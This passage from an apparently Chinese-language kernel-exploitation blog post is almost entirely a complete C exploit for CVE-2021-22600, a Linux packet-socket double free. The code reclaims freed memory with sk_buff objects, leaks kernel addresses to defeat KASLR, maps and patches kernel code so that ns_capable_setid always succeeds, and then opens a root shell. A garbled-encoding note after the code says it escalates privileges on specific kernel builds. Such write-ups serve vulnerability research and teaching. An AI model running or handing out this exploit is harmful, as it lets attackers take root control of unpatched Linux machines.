class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> IS_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_ERR(ptr) ((uintptr_t) ptr &gt;= (uintptr_t) -4095UL)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PTR_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTR_ERR(ptr) ((int) (intptr_t) ptr)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCCESS_MSG(msg) <span class="hljs-string">&quot;\033[32m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO_MSG(msg) <span class="hljs-string">&quot;\033[34m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERR_MSG(msg) <span class="hljs-string">&quot;\033[31m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_error(msg)      puts(ERR_MSG(msg))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KASLR_GRANULARITY 0x10000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KASLR_MASK (~(KASLR_GRANULARITY - 1))</span><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Error at: &quot;</span>) <span class="hljs-string">&quot;%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] Failed to get the root!&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    log_success(<span class="hljs-string">&quot;[+] Successful to get the root.&quot;</span>);<br>    log_info(<span class="hljs-string">&quot;[*] Execve root shell now...&quot;</span>);<br><br>    system(<span class="hljs-string">&quot;su root -c sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of potential segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(INFO_MSG(<span class="hljs-string">&quot;[*] Process binded to core: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> tmp_fd;<br><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    write(tmp_fd, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getuid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getgid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_banner</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(SUCCESS_MSG(<span class="hljs-string">&quot;--------- CVE-2021-22600 Exploitation ---------&quot;</span>));<br>    <span class="hljs-built_in">puts</span>(INFO_MSG(<span class="hljs-string">&quot;-------\t\t Author: &quot;</span>) <span class="hljs-string">&quot;arttnba3&quot;</span> INFO_MSG(<span class="hljs-string">&quot; \t-------&quot;</span>));<br>    <span class="hljs-built_in">puts</span>(SUCCESS_MSG(<span class="hljs-string">&quot;---------  User Space Mapping Attack  ---------\n&quot;</span>));<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_retire_blk_tov;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_sizeof_priv;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_feature_req_word;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span> &#123;</span><br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_RX_RING 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_OBJ_SZ (512 + 8)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SKBUFF_DATA_SZ (VICTIM_OBJ_SZ)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_BLK_SZ 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_BLK_NR (VICTIM_OBJ_SZ / sizeof(char*))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_FRAME_SZ TP_BLK_SZ</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_FRAME_NR (TP_BLK_SZ * TP_BLK_NR / TP_FRAME_SZ)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810bc5c0</span><br><br><span class="hljs-type">int</span> p2c_pipe[<span class="hljs-number">2</span>], c2p_pipe[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploitation_child</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd, version;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>], *pgv_region, kernel_leak, orig_page;<br>    <span class="hljs-type">char</span> *kcode_map;<br>    <span class="hljs-type">int</span> sk_socket[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br>    unshare_setup();<br><br>    <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_socket) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to create socket pair&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED at creating socket pair!&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Creating packet socket...&quot;</span>);<br><br>    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span> (socket_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to create socket&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Set socket version to TPACKET_V3...&quot;</span>);<br><br>    version = TPACKET_V3;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                    &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to use setsockopt to set TPACKET_V3&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Allocating RX ring buffer...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = TP_BLK_SZ;<br>    req.tp_block_nr = TP_BLK_NR;<br>    req.tp_frame_size = TP_FRAME_SZ;<br>    req.tp_frame_nr = TP_FRAME_NR;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_RX_RING)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate RX ring buffer&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Freeing RX ring buffer...&quot;</span>);<br><br>    req.tp_block_size = <span class="hljs-number">0x3361626e</span>;<br>    req.tp_block_nr = <span class="hljs-number">0</span>;<br>    req.tp_frame_size = <span class="hljs-number">0x74747261</span>;<br>    req.tp_frame_nr = <span class="hljs-number">0</span>;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_RX_RING)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to free RX ring buffer&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Allocating pgv and free to reclaim as sk_buff...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (write(sk_socket[<span class="hljs-number">0</span>], buf, SKBUFF_DATA_SZ) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to write sk_sockets&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate sk_buff to reclaim pgv back!&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Free in V2 and reallocate pgv in V3...&quot;</span>);<br><br>    version = TPACKET_V2;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                    &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to use setsockopt to set TPACKET_V2&quot;</span>);<br>    &#125;<br><br>    req.tp_block_size = <span class="hljs-number">0x3361626e</span>;<br>    req.tp_block_nr = <span class="hljs-number">0</span>;<br>    req.tp_frame_size = <span class="hljs-number">0x74747261</span>;<br>    req.tp_frame_nr = <span class="hljs-number">0</span>;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_RX_RING)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to free RX ring buffer&quot;</span>);<br>    &#125;<br><br>    version = TPACKET_V3;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                    &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to use setsockopt to set TPACKET_V3&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = TP_BLK_SZ;<br>    req.tp_block_nr = TP_BLK_NR;<br>    req.tp_frame_size = TP_FRAME_SZ;<br>    req.tp_frame_nr = TP_FRAME_NR;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_RX_RING)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate RX ring buffer&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Try leaking with sk_buff...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (read(sk_socket[<span class="hljs-number">1</span>], buf, SKBUFF_DATA_SZ) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to read sk_sockets&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to read sk_buff to leak data!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    for (int i = 0; i &lt; (SKBUFF_DATA_SZ / 8); i++) &#123;</span><br><span class="hljs-comment">        printf(&quot;[----data-dump----][%d] %lx\n&quot;, i, buf[i]);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br><br>    orig_page = buf[<span class="hljs-number">0</span>];<br>    page_offset_base = buf[<span class="hljs-number">0</span>] &amp; KASLR_MASK;<br>    buf[<span class="hljs-number">0</span>] = page_offset_base + <span class="hljs-number">0x9d000</span>;<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-keyword">if</span> (write(sk_socket[<span class="hljs-number">0</span>], buf, SKBUFF_DATA_SZ) &lt; <span class="hljs-number">0</span>) &#123;<br>            perror(<span class="hljs-string">&quot;[x] Unable to write sk_sockets&quot;</span>);<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate sk_buff to reclaim pgv back!&quot;</span>);<br>        &#125;<br>    <br>        pgv_region = mmap(<span class="hljs-literal">NULL</span>, TP_BLK_SZ * TP_BLK_NR, PROT_READ | PROT_WRITE, MAP_SHARED, socket_fd, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (pgv_region == MAP_FAILED) &#123;<br>            perror(<span class="hljs-string">&quot;[x] Unable to do pgv mapping&quot;</span>);<br>            err_exit(<span class="hljs-string">&quot;FAILED to map pgv to user space!&quot;</span>);<br>        &#125;<br>    <br>        kernel_leak = pgv_region[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (kernel_leak &gt; <span class="hljs-number">0xffffffff81000000</span><br>            &amp;&amp; (kernel_leak &amp; <span class="hljs-number">0xfff</span>) &lt; <span class="hljs-number">0x100</span>) &#123;<br>            kernel_base = kernel_leak &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>            kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-built_in">printf</span>(<br>                INFO_MSG(<span class="hljs-string">&quot;[*] Leak secondary_startup_64 : &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,kernel_leak<br>            );<br>            <span class="hljs-built_in">printf</span>(<br>                SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got kernel base: &quot;</span>) <span class="hljs-string">&quot;%lx&quot;</span><br>                SUCCESS_MSG(<span class="hljs-string">&quot;, kernel offset: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,<br>                kernel_base,<br>                kernel_offset<br>            );<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got page_offset_base: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>, page_offset_base);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        munmap(pgv_region, TP_BLK_SZ * TP_BLK_NR);<br><br>        <span class="hljs-keyword">if</span> (read(sk_socket[<span class="hljs-number">1</span>], buf, SKBUFF_DATA_SZ) &lt; <span class="hljs-number">0</span>) &#123;<br>            perror(<span class="hljs-string">&quot;[x] Unable to read sk_sockets&quot;</span>);<br>            err_exit(<span class="hljs-string">&quot;FAILED to read sk_buff to leak data!&quot;</span>);<br>        &#125;<br><br>        page_offset_base -= KASLR_GRANULARITY;<br>        buf[<span class="hljs-number">0</span>] = page_offset_base + <span class="hljs-number">0x9d000</span>;<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Start mapping kernel code segment to user space...&quot;</span>);<br><br>    munmap(pgv_region, TP_BLK_SZ * TP_BLK_NR);<br><br>    <span class="hljs-keyword">if</span> (read(sk_socket[<span class="hljs-number">1</span>], buf, SKBUFF_DATA_SZ) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to read sk_sockets&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to read sk_buff to leak data!&quot;</span>);<br>    &#125;<br><br>    buf[<span class="hljs-number">0</span>] = NS_CAPABLE_SETID + kernel_offset;<br>    <span class="hljs-keyword">if</span> (write(sk_socket[<span class="hljs-number">0</span>], buf, SKBUFF_DATA_SZ) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to write sk_sockets&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate sk_buff to reclaim pgv back!&quot;</span>);<br>    &#125;<br><br>    pgv_region = mmap(<span class="hljs-literal">NULL</span>, TP_BLK_SZ * TP_BLK_NR, PROT_READ | PROT_WRITE, MAP_SHARED, socket_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (pgv_region == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to do pgv mapping&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to map pgv to user space!&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span><br><span class="hljs-comment">     * so we can just patch it to let it always return true :)</span><br><span class="hljs-comment">    **/</span><br>    kcode_map = (<span class="hljs-type">char</span>*) pgv_region;<br>    <span class="hljs-comment">//memset(kcode_map + (NS_CAPABLE_SETID &amp; 0xfff), &#x27;\x90&#x27;, 0x40); /* nop */</span><br>    <span class="hljs-built_in">memcpy</span>(<br>        kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>), <br>        <span class="hljs-string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="hljs-comment">/* endbr64 */</span><br>        <span class="hljs-string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="hljs-comment">/* mov rax, 1 */</span><br>        <span class="hljs-string">&quot;\xc3&quot;</span>, <span class="hljs-comment">/* ret */</span><br>        <span class="hljs-number">12</span><br>    );<br><br>    log_info(<span class="hljs-string">&quot;[*] Restoring the original...&quot;</span>);<br><br>    munmap(pgv_region, TP_BLK_SZ * TP_BLK_NR);<br>    <span class="hljs-keyword">if</span> (read(sk_socket[<span class="hljs-number">1</span>], buf, SKBUFF_DATA_SZ) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to read sk_sockets&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to read sk_buff to leak data!&quot;</span>);<br>    &#125;<br><br>    buf[<span class="hljs-number">0</span>] = orig_page;<br>    <span class="hljs-keyword">if</span> (write(sk_socket[<span class="hljs-number">0</span>], buf, SKBUFF_DATA_SZ) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to write sk_sockets&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate sk_buff to reclaim pgv back!&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Notifiying parent process...&quot;</span>);<br><br>    <span class="hljs-comment">/* notify the parent */</span><br>    write(c2p_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;arttnba3&quot;</span>));<br><br>    <span class="hljs-comment">/* just to keep the child sleeping... */</span><br>    read(p2c_pipe[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    sleep(<span class="hljs-number">114514</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploitation</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> identifier[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">int</span> ret;<br><br>    print_banner();<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    log_info(<span class="hljs-string">&quot;[*] Creating child process to user packet socket...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (pipe(p2c_pipe) &lt; <span class="hljs-number">0</span> || pipe(c2p_pipe) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to create pipe&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to create pipe for communication!&quot;</span>);<br>    &#125;<br><br>    ret = fork();<br>    <span class="hljs-keyword">if</span> (!ret) &#123;<br>        exploitation_child();<br>        <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to fork out child process&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to create child process for exploit!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(identifier, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(identifier));<br>    read(c2p_pipe[<span class="hljs-number">0</span>], identifier, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;rat3bant&quot;</span>));<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(identifier, <span class="hljs-string">&quot;arttnba3&quot;</span>)) &#123;<br>        err_exit(<span class="hljs-string">&quot;WRONG message got from child.&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...&quot;</span>);<br><br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    sleep(<span class="hljs-number">5</span>);<br><br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    get_root_shell();<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    exploitation();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒï¼Œä½† <strong>ä¾èµ–äºç‰¹å®šçš„å†…æ ¸é•œåƒä¸­ç‰¹å®šå†…æ ¸å‡½æ•°çš„åœ°å€</strong> ï¼Œä¸”æœ‰ä¸€å®šæ¦‚ç‡å› ä¸ºå®šæ—¶å™¨è€Œå´©æºƒï¼š</p><p><img src="https://s2.loli.net/2025/05/05/mcFVB2EOKzv3aoi.png"></p><blockquote><p>ç›®å‰ç¬”è€…æƒ³åˆ°çš„å¯èƒ½çš„çš„ä¼˜åŒ–æ–¹æ³•æ˜¯æƒ³åŠæ³•å»æ‰¾å†…æ ¸ä»£ç æ®µåœ¨ <code>page_offset_base</code> ä¸Šçš„åç§»ï¼ˆä¹Ÿå°±æ˜¯å†…æ ¸é•œåƒåœ¨ç‰©ç†å†…å­˜ä¸­çš„åŠ è½½åœ°å€ï¼‰ï¼Œä¸è¿‡è¿™ä¸€å—å†…å­˜å¤§æ¦‚ç‡ä¼šè¢«é…ç½®å’Œå†…æ ¸ä»£ç 